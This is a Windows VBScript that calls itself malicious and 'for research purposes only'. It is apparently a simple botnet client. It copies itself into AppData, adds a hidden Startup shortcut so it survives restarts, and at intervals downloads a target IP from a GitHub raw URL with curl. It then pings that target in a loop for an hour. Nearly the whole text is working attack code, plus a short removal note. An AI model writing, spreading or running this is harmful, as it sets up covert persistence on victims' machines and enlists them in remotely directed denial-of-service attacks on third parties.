' WARNING: THE FOLLOWING SCRIPT IS MALICIOUS AND POTENTIALLY DANGEROUS
' IT IS INTENDED FOR RESEARCH PURPOSES ONLY. RUN AT YOUR OWN RISK

' Removal: delete the link in your startup folder and delete the file
' named test_botnet.vbs from AppData\Roaming\Microsoft

Set objShell = CreateObject("WScript.Shell")
strScriptPath = WScript.ScriptFullName
strAppDataDir = objShell.ExpandEnvironmentStrings("%AppData%")
strTargetDir = strAppDataDir & "\Microsoft"
strStartupFolder = objShell.SpecialFolders("Startup")
bFoundShortcut = False

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set colItems = objFSO.GetFolder(strStartupFolder).Files
For Each objItem In colItems
    If LCase(objItem.Name) = "ping_task_with_startup.vbs.lnk" Then
        bFoundShortcut = True
        Exit For
    End If
Next

If Not bFoundShortcut Then
    Set objLink = objShell.CreateShortcut(strStartupFolder & "\ping_task_with_startup.vbs.lnk")
    objLink.TargetPath = strTargetDir & "\ping_task_with_startup.vbs"
    objLink.WorkingDirectory = strTargetDir
    objLink.Save
End If

If InStr(strScriptPath, strTargetDir, 1, 1) = 0 Then
    If Not objFSO.FolderExists(strTargetDir) Then
        objFSO.CreateFolder strTargetDir
    End If

    objFSO.CopyFile strScriptPath, strTargetDir & "\ping_task_with_startup.vbs"

    objShell.Run "wscript.exe " & strTargetDir & "\ping_task_with_startup.vbs", 0, False

    WScript.Quit
End If

Sub PerformTask()
    Do
        WScript.Sleep(15000)
        objShell.Run "cmd /c curl -o task.txt https://raw.githubusercontent.com/CoC-Fire/fun-scripts/main/task.txt", 0, True

        Set objFSO = CreateObject("Scripting.FileSystemObject")
        If objFSO.FileExists("task.txt") Then
            Set objFile = objFSO.OpenTextFile("task.txt", 1)
            strIP = objFile.ReadAll
            objFile.Close

            If strIP <> "" Then
                startTime = Now
                Do While Now < DateAdd("n", 60, startTime)
                    objShell.Run "ping -n 1 " & strIP, 0, True
                Loop
                strIP = ""
            End If
        End If

        WScript.Sleep(900000)
    Loop
End Sub

PerformTask()
